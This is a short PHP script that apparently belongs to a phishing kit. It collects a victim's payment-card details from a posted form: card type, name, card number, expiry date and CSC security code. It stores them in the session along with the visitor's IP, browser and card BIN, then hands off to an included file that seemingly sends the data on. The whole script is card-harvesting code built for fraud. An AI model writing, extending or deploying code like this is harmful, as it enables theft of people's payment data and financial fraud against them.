<?php
session_start();
date_default_timezone_set('America/Los_Angeles');
$TIME_DATE = date('h:i A d/m/Y');

include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['loged'] = "loged2";

$_SESSION['TIME_DATE'] = $TIME_DATE;



include 'function.php';
include("system.php");

$_SESSION['_c_type_'] = $_POST['c_type'];
$_SESSION['_NameOnCard_'] = $_POST['NameOnCard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);


$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];

$ip=$_SESSION['ip']=getip();




include('../tnt/sv1.php');




?>